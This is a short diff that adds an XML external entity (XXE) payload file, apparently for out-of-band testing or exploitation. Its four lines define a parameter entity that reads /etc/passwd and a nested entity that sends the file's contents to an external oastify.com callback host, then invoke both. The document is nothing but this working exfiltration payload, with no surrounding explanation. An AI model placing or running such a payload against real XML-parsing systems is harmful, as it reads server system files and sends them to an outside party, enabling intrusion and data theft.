@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % payload "<!ENTITY &#x25; exfil SYSTEM 'http://zbe02uyauwssh79m9wxowevf066xu0ip.oastify.com/?data=%file;' encoding='base64'>">
+%payload;
+%exfil;
